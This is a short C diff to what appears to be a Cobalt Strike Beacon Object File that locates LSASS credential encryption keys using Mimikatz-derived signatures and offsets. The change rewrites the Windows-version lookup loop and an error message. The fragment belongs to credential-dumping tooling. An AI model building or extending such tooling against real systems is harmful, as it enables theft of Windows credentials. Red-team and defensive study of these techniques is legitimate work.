@@ -17,10 +17,11 @@ BOOL SearchForCredentialKeys(DWORD dBuildNumber, DWORD64* hAesKeyAddress, DWORD6
     //
     // Get the correct Mimikatz byte sequences and offsets based on version
     //
-    int i = 0;
-    for (i = 0; i < 6; i++) 
+    int arraySize = sizeof(LsassKeyOffsetsArray) / sizeof(LsassKeyOffsetsArray[0]);
+    int i = arraySize - 1;
+    for (; i >= 0; i--)
     {
-        if ( (dBuildNumber >= LsassKeyOffsetsArray[i].WindowsVersion) && (dBuildNumber < LsassKeyOffsetsArray[i+1].WindowsVersion) )
+        if (dBuildNumber >= LsassKeyOffsetsArray[i].WindowsVersion)
         {
             credentialKeySig = LsassKeyOffsetsArray[i].credentialKeySig;
             KeySigSize = LsassKeyOffsetsArray[i].KeySigSize;
@@ -34,7 +35,7 @@ BOOL SearchForCredentialKeys(DWORD dBuildNumber, DWORD64* hAesKeyAddress, DWORD6
 
     if (credentialKeySig == NULL || KeySigSize == 0 || AES_OFFSET == 0 || DES_OFFSET == 0 || IV_OFFSET == 0)
     {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get correct offsets for the Windows version!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get correct key offsets for Windows build %lu!\n", dBuildNumber);
         return FALSE;
     }
 
